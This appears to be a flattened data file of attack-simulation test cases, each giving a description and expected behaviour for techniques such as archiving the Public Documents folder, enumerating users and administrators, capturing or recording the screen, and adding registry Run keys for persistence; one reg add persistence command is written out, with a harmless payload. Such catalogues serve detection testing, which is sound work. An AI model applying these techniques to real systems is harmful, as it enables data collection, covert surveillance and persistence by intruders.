attacks.expected_behavior: Creates a zip archive named 'advanced_archived_data.zip' in the TEMP directory containing all files from the Public Documents folder.

attacks.description: Advanced command using the tar command (available on newer Windows versions) to create a tar.gz archive of the Public Documents folder.
attacks.expected_behavior: Creates a tar.gz archive named 'archive.tar.gz' in the TEMP directory containing all files from the Public Documents folder.

attacks.description: Archives collected data using tar
attacks.expected_behavior: Creates an archive file named archive.tar.gz containing the collected data

attacks.description: Archives collected data using zip
attacks.expected_behavior: Creates an archive file named archive.zip containing the collected data

attacks.description: Archives collected data using 7z
attacks.expected_behavior: Creates an archive file named archive.7z containing the collected data

attacks.description: List local administrators group members
attacks.expected_behavior: Displays members of the local administrators group

attacks.description: Display current user and group information
attacks.expected_behavior: Shows the current user and their group memberships

attacks.description: List domain users (requires domain-joined machine and admin privileges)
attacks.expected_behavior: Displays a list of domain users if the machine is domain-joined and the command is run with admin privileges

attacks.description: Retrieve the passwd database to discover user accounts
attacks.expected_behavior: Displays a list of user accounts on the system

attacks.description: Display user and group information for the current user
attacks.expected_behavior: Displays the user ID, group ID, and other information for the current user

attacks.description: Retrieve the group database to discover groups and their members
attacks.expected_behavior: Displays a list of groups and their members on the system

attacks.description: Capture the entire screen and save it as a PNG file in the temp directory.
attacks.expected_behavior: The command captures the entire screen and saves it as a PNG file named screenshot.png in the temp directory.

attacks.description: Use PowerShell to capture the screen and save it as a PNG file in the temp directory. This method provides more flexibility and control over the screen capture process.
attacks.expected_behavior: The command captures the entire screen and saves it as a PNG file named screenshot.png in the temp directory using PowerShell.

attacks.description: Utilize the nircmd utility to capture the screen and save it as a PNG file in the temp directory. Note: The nircmd utility needs to be installed or available on the system.
attacks.expected_behavior: The command captures the entire screen and saves it as a PNG file named screenshot.png in the temp directory using nircmd.

attacks.description: Capture a screenshot and save it to the home directory
attacks.expected_behavior: A screenshot will be saved to the home directory

attacks.description: Record the screen for 10 seconds and save it to the home directory
attacks.expected_behavior: A screen recording will be saved to the home directory

attacks.description: Record the screen using ffmpeg with advanced options
attacks.expected_behavior: A screen recording will be saved to the home directory with advanced options

attacks.description: Basic: Adds a registry key to run notepad.exe on startup using reg.exe, requiring admin privileges.
attacks.expected_behavior: Notepad will open on the next login.

attacks.description: Intermediate: Uses PowerShell to add a registry key for calc.exe, demonstrating an alternative method with -Force for overwrite, requiring admin privileges.
attacks.expected_behavior: Calculator will open on the next login.

attacks.command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test3 /t REG_SZ /d "cmd.exe /c echo Hello > %TEMP%\test.txt" /f
attacks.description: Advanced: Adds a registry key to run a command that writes to a temp file on startup, simulating a more complex payload execution, requiring admin privileges.
attacks.expected_behavior: A file named test.txt will be created in the temp directory with the content 'Hello' on the next login.
